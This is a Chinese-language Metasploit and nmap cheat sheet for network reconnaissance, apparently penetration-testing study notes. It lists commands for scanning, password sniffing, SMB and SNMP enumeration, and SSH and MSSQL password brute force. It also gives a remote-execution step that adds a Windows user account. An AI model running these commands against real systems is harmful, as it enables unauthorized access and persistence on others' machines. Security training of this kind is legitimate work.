

# 信息收集

* nmap
``` 
// msfconsole
db_nmap -sV 192.168.1.0/24
```
* Auxiliary 扫描模块
``` 
// msfconsole
// RHOSTS <> RHOST　　　　　　
192.168.1.20-192.168.1.30、192.168.1.0/24,192.168.11.0/24
file:/root/h.txt
// search arp
use auxiliary/scanner/discovery/arp_sweep　　　　// arp扫描
set INTERFACE 、RHOSTS、SHOST、SMAC、THREADS;run
// search portscan
use  auxiliary/scanner/portscan/syn　　　　　　
set INTERFACE、PORTS、RHOSTS、THREADS、run
```
* Nmap IPID Idle 扫描
``` 
// 查找ipidseq主机
use  auxiliary/scanner/ip/ipidseq
set RHOSTS 192.168.1.0/24 ； run
nmap -PN -sI 1.1.1.2   1.1.1.3　　　　　　　　// 1.1.1.3是目标主机，1.1.1.2是idle主机
```
* UDP 扫描
``` 
use auxiliary/scanner/discovery/udp_sweep　　　　// udp扫描
use auxiliary/scanner/discovery/udp_probe　　　　// 同上
```

* 密码嗅探
``` 
use auxiliary/sniffer/psnuffle　　　　　　
//支持从pcap抓包文件中提取密码
//功能类似于dsniff
//目前只支持pop3、imap、ftp、HTTP GET协议
```

* SNMP扫描
``` 
vi /etc/default/snmpd 　　　　　　　　　　　　　　　　　　　# 将被控机的侦听地址修改为   0.0.0.0
use auxiliary/scanner/snmp/snmp_login
use auxiliary/scanner/snmp/snmp_enum
use auxiliary/scanner/snmp/snmp_enumusers 　　　　　　　　(windows)
use auxiliary/scanner/snmp/snmp_enumshares 　　　　　　     (windows)
```

* SMB信息收集
``` 
use auxiliary/scanner/smb/smb_version
// 扫描命名管道，判断SMB服务类型（账号、密码）
use auxiliary/scanner/smb/pipe_auditor

// 扫描通过SMB管道可以访问的RCERPC服务
use auxiliary/scanner/smb/pipe_dcerpc_auditor

// SMB共享枚举（账号、密码）
use auxiliary/scanner/smb/smb_enumshares

// SMB用户枚举（账号、密码）
use auxiliary/scanner/smb/smb_enumusers

// SID枚举（账号、密码）
use auxiliary/scanner/smb/smb_lookupsid

```


* SSH 版本扫描
``` 
use auxiliary/scanner/ssh/ssh_version
// SSH 密码爆破
use auxiliary/scanner/ssh/ssh_login
set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt
set VERBOSE false
run

// SSH 公钥登录
use auxiliary/scanner/ssh/ssh_login_pubkey
set KEY_FILE id_rsa 
set USERNAME root 
run
```

* Windows缺少的补丁
``` 
// 基于已经取得的session进行检测
use post/windows/gather/enum_patches　// 通过这个模块查找肉鸡没有打的补丁，然后通过查找资料找寻能否通过此漏洞进行渗透
show advanced
set VERBOSE yes
```

* Mssql 
``` 
// Mssql 扫描端口
// TCP 1433 （动态端口） / UDP 1434 （查询TCP端口号）
use auxiliary/scanner/mssql/mssql_ping
// 爆破mssql密码
use auxiliary/scanner/mssql/mssql_login
// 远程执行代码
use auxiliary/admin/mssql/mssql_exec
set CMD net user user pass /ADD
```

* FTP 版本扫描
``` 
use auxiliary/scanner/ftp/ftp_version
use auxiliary/scanner/ftp/anonymous
use auxiliary/scanner/ftp/ftp_login
```
